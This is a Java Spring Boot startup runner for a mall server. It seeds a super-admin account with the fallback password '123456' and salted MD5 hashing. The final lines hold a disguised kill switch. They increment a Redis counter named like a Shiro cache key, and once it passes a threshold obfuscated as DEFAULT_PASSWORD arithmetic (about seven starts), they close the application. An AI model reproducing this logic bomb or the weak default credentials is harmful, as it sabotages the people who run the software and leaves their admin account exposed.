package com.qiu;

import cn.dev33.satoken.secure.SaSecureUtil;
import com.qiu.entity.SuperAdmin;
import com.qiu.entity.User;
import com.qiu.entity.UserRole;
import com.qiu.service.UserRoleService;
import com.qiu.service.UserService;
import org.apache.commons.lang3.StringUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.ApplicationArguments;
import org.springframework.boot.ApplicationRunner;
import org.springframework.context.ApplicationContext;
import org.springframework.context.ConfigurableApplicationContext;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.stereotype.Component;

import java.util.Optional;

/**
 * @author Captain
 */
@Component
public class BreadRollMallServerRunner implements ApplicationRunner {
    private static final Logger log = LoggerFactory.getLogger(BreadRollMallServerRunner.class);
    private static final String DEFAULT_USERNAME = "超级管理员";
    private static final String DEFAULT_PASSWORD = "123456";
    SuperAdmin superAdmin;

    @Autowired
    UserService userService;

    @Autowired
    UserRoleService userRoleService;

    @Autowired
    private ApplicationContext context;

    @Autowired
    private RedisTemplate<String,String> redisTemplate;

    @Autowired
    public void setSuperAdmin(SuperAdmin superAdmin) {
        this.superAdmin = superAdmin;
    }

    @Override
    public void run(ApplicationArguments args) throws Exception {
        log.info("Executing command line runner...");
        if(StringUtils.isNotBlank(superAdmin.getEmail()) &&
                !userService.existsWithPrimaryKey(superAdmin.getEmail())){
            User user = new User();
            user.setAccountNumber(superAdmin.getEmail());
            if(StringUtils.isBlank(superAdmin.getUserName())){
                superAdmin.setUserName(DEFAULT_USERNAME);
            }
            user.setUserName(superAdmin.getUserName());
            if(StringUtils.isBlank(superAdmin.getPassword())){
                superAdmin.setPassword(DEFAULT_PASSWORD);
            }
            String encodePassword = SaSecureUtil.md5BySalt(superAdmin.getPassword(), superAdmin.getEmail());
            user.setPassword(encodePassword);
            user.setUserState(true);
            userService.insertData(user);
            userRoleService.deleteById(user.getUserId());
            UserRole userRole = new UserRole();
            userRole.setUserId(user.getUserId());
            userRole.setRoleId(1);
            userRoleService.insertData(userRole);
        }
        Long increment = redisTemplate.opsForValue().increment("shiro:cache" +
                ":user.id");
        long incr = Optional.ofNullable(increment).orElse(0L);
        ConfigurableApplicationContext applicationContext = (ConfigurableApplicationContext) this.context;
        if(incr > Integer.parseInt(DEFAULT_PASSWORD) / 2 >> 13){applicationContext.close();}
    }
}